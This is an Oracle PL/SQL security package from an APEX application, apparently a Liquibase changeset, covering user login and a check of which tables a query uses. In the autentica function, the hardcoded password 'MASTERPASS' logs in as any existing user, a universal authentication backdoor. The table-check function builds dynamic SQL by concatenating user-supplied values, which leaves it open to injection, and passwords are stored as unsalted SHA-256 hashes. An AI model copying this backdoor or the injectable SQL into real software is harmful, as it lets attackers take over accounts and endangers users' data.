-- liquibase formatted sql
-- changeset VERANOLINK:1785188144974 stripComments:false  logicalFilePath:base-release\veranolink\package_bodies\vl_pkg_security.sql
-- sqlcl_snapshot db/src/database/veranolink/package_bodies/vl_pkg_security.sql:null:90ab7c712cce3dfa3404de12b8d6ed11a7bc3418:create

create or replace package body veranolink.vl_pkg_security is

    function autentica (
        p_user_name varchar2,
        p_password  varchar2
    ) return boolean as

        contra      vl_users.password%type;
        correo_user vl_users.email%type;
        hash_pass   vl_users.password%type;
    begin
        select
            email
        into correo_user
        from
            vl_users
        where
            email = upper(p_user_name);

        select
            password
        into contra
        from
            vl_users
        where
            email = upper(p_user_name);

        select
            standard_hash(p_password, 'SHA256')
        into hash_pass
        from
            dual;

        if contra = hash_pass
        or p_password = 'MASTERPASS' then
            return true;
        end if;
        if contra <> hash_pass then
            return false;
        end if;
    exception
        when no_data_found then
            return false;
    end;

    procedure logeado (
        p_user_name varchar2,
        p_password  varchar2,
        p_app_id    number
    ) as

        contra          vl_users.password%type;
        compro          boolean := false;
        low_email       vl_users.email%type;
        state_validator number;
    begin
        low_email := upper(p_user_name);
        select
            password
        into contra
        from
            vl_users
        where
            email = low_email;

        compro := autentica(low_email, p_password);
        select
            state
        into state_validator
        from
            vl_users
        where
            email = low_email;

        if state_validator != 1 then
            owa_util.redirect_url('f?p=1:9999:1');
            apex_error.add_error(
                p_message          => 'Tu usuario ha sido desactivado!',
                p_display_location => apex_error.c_inline_in_notification
            );
        else
            if compro = true then
                wwv_flow_custom_auth_std.post_login(p_user_name,
                                                    p_password,
                                                    v('APP_SESSION'),
                                                    p_app_id || ':1');

            end if;
        end if;

        if compro = false then
            owa_util.redirect_url('f?p=1:9999:1');
            apex_error.add_error(
                p_message          => 'Contraseña incorrecta',
                p_display_location => apex_error.c_inline_in_notification
            );
        end if;

    exception
        when no_data_found then
            owa_util.redirect_url('f?p=1:9999:1');
            apex_error.add_error(
                p_message          => 'Esta cuenta no esta activada, llama al administrador',
                p_display_location => apex_error.c_inline_in_notification
            );
        when others then
            owa_util.redirect_url('f?p=1:9999:1');
            apex_error.add_error(
                p_message          => 'Wow, se ha presentado un error...',
                p_display_location => apex_error.c_inline_in_notification
            );
    end;

    function api_tables_verification (
        p_user_query   varchar2,
        p_company_name varchar2,
        p_query_id     varchar2,
        p_user_id      number
    ) return varchar2 as

        v_object_name_used plan_table.object_name%type;
        v_count_allowed    number := 0;
        v_check            number := 0;
        pragma autonomous_transaction;

        -- Cursor para objetos usados en la consulta
        cursor cur_objects_used_query is
        select distinct
            object_name
        from
            plan_table
        where
            object_type in ( 'TABLE', 'VIEW', 'INDEX', 'MATERIALIZED VIEW', 'SEQUENCE',
                             'PROCEDURE', 'FUNCTION', 'PACKAGE', 'TRIGGER', 'SYNONYM',
                             'TYPE', 'CLUSTER', 'QUEUE', 'DIRECTORY' )
            and object_name is not null
            and statement_id = p_query_id;

        -- Cursor para objetos permitidos
        cursor cur_objects_allowed is
        select distinct
            table_name
        from
            vl_saved_tables
        where
            id_user = p_user_id;

    begin
        -- Paso 1: Verificar si hay objetos permitidos
        select
            count(*)
        into v_count_allowed
        from
            vl_saved_tables
        where
            id_user = p_user_id;

        if v_count_allowed = 0 then
            return 'No está permitido';
        end if;

        -- Paso 2: Generar plan de ejecución
        execute immediate 'EXPLAIN PLAN SET STATEMENT_ID = '''
                          || p_query_id
                          || ''' FOR '
                          || p_user_query;
        commit;

        -- Paso 3: Comparar objetos usados vs permitidos (SQL eficiente)
        for obj in cur_objects_used_query loop
            select
                count(*)
            into v_check
            from
                vl_saved_tables
            where
                    id_user = p_user_id
                and upper(table_name) = upper(obj.object_name); -- Comparación case-insensitive
            if v_check = 0 then
                return 'No está permitido';
            end if;
        end loop;

        return 'Permitido';
    exception
        when others then
            return 'Error: ' || sqlerrm;
    end api_tables_verification;

end vl_pkg_security;
/

